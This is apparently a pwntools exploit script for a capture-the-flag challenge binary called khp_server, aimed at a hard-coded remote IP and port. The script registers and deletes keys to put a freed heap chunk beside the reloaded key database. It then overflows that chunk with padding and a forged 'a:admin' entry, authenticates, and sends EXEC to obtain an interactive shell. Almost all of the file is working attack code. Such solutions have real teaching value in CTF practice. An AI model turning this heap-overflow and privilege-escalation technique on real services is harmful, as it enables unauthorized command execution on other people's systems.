#!/usr/bin/python3

from pwn import *

# exe = ELF("./khp_server_patched", )
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.35.so")

# context.binary = exe

# context.terminal = ['tmux', 'splitw', '-h', '-p', '70', '-I']
# context.log_level 	= "INFO"
# isDebug = False

# gs = '''
# break main
# continue
# '''.format(**locals())

# def start_local(isDebug, argv=[], *a, **kw):
# 	if args.GDB or isDebug:
# 		return gdb.debug([exe.path], gdbscript=gs)
# 	else:
# 		return process([exe.path], *a, **kw)
		
# def find_ip_offset(payload):
# 	io = process(elf.path)
# 	io.sendlineafter(b": ", payload)
	
# 	io.wait()
	
# 	#ip_offset = cyclic_find(io.corefile.pc) # x86
# 	ip_offset = cyclic_find(io.corefile.read(io.corefile.sp, 4))
# 	info("Located RIP offset at [%s]", ip_offset)
# 	return ip_offset


def register_native_key(user_name="a", user_type="a", some_string=b"a;"):
    command = f"REKE {user_name}:{user_type} ".encode() + some_string
    io.sendline(command)
    print(io.recv())

def delete_key(key = 1):
	io.sendline(f"DEKE {key}".encode())
	print(io.recv())

def reload_db():
	io.sendline(b"RLDB")
	print(io.recv())

def auth(id = 1):
	io.sendline(f"AUTH {id}".encode())
	print(io.recv())

def askForShell():
	io.sendline(b"EXEC")
	print(io.recv())
		
#===========================================================
#                    EXPLOIT GOES HERE					   #
#===========================================================

######## LOCAL ########
#ip_offset = find_ip_offset(cyclic(200))
#ip_offset = 56
# io = start_local(isDebug)

######## REMOTE ########
# io = remote('127.0.0.1', 1337)
io = remote("94.237.49.212", 36058)
io.timeout = 1

# Register some key and delete it
sleep(1)
register_native_key(user_name="a", user_type="admin", some_string=b"a;")

sleep(1)
register_native_key(user_name="b", user_type="b", some_string=b"b;")

sleep(1)
delete_key(2)

# Now reloading the db will place the run time data right after the chunk that held the registered key (which is now in tcache)
sleep(1)
reload_db()

# Allocate back the tcache chunk and overflow it so it overwrites the 'reload_db' data (the actual keys in the users.keys file that is loaded to memory)
sleep(1)
register_native_key(some_string=b"w" * 92 + b"a:admin a;")

# AUTH 2 to authenticate as that user
sleep(1)
auth(1) # <-- this might not work for some reason. Call it manually: 'AUTH 1' and then 'EXEC'

# Ask for shell if authenticated successfuly...
sleep(1)
askForShell()

io.interactive()
